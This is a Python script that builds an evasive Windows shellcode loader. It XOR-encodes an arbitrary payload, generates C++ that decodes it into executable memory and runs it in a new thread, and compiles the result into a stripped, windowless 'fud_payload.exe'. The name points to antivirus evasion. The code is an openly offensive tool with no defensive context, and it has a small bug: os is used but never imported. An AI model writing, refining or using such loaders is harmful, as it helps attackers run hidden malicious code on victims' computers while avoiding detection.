import sys
import subprocess

def build_loader(payload_path):
    with open(payload_path, 'rb') as f:
        data = f.read()
    
    hex_payload = ", ".join(f"0x{b ^ 0xAA:02x}" for b in data)

    cpp_source = f"""
#include <windows.h>
extern "C" void* SyscallStub(void* addr, SIZE_T size);

int main() {{
    unsigned char payload[] = {{ {hex_payload} }};
    SIZE_T sz = sizeof(payload);
    LPVOID mem = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    unsigned char* p = static_cast<unsigned char*>(mem);
    for(SIZE_T i=0; i<sz; i++) p[i] = payload[i] ^ 0xAA;
    DWORD old;
    VirtualProtect(mem, sz, PAGE_EXECUTE_READ, &old);
    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(t, INFINITE);
    return 0;
}}
"""
    with open("loader.cpp", "w") as f: f.write(cpp_source)
    
    # Compilation with explicit size reporting
    cmd = ["x86_64-w64-mingw32-g++", "loader.cpp", "-o", "fud_payload.exe", "-Os", "-s", "-static", "-mwindows"]
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(f"Compiler Output:\n{result.stderr}")
    print(f"Binary Size: {os.path.getsize('fud_payload.exe')} bytes")

if __name__ == "__main__": build_loader(sys.argv[1])
